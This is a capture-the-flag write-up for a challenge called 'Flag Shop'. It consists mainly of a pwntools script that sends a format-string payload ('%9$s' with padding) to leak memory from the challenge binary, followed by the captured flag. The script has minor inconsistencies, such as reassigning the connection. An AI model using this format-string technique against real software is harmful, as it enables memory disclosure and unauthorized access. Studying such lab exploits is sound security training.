# Flag Shop

Solved by: @CapangJabba

## Question:
Welcome to the SECURE shop, where your goal is to explore the platform and uncover the secrets hidden within. After creating a user account, you'll interact with different features of the system. However, the admin panel remains restricted, and your challenge is to figure out how to access it.

## Solution:
```
from pwn import *

def con(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug(exe, gdbscript='''
            b *0x5555555555fe
            c
            ''')
    else:
        return process(exe)


exe = './flagshop'
io = con()
elf = context.binary = ELF(exe, checksec = False)

context.log_level = 'info'

i = 9
io = process(level='error')
io.sendline(b'a')
payload = 'XXXXXXXXXXXXXXXXXXXXXXX%{}$s'.format(i).encode().ljust(34, b'A')
info(payload)
io.sendline(payload)
io.sendline(b'1')
io.interactive()
```

**Flag:** `sun{c@n_st1ll_r3@d_off_the_he@p_fr0m_st@ck_po!nters!}`
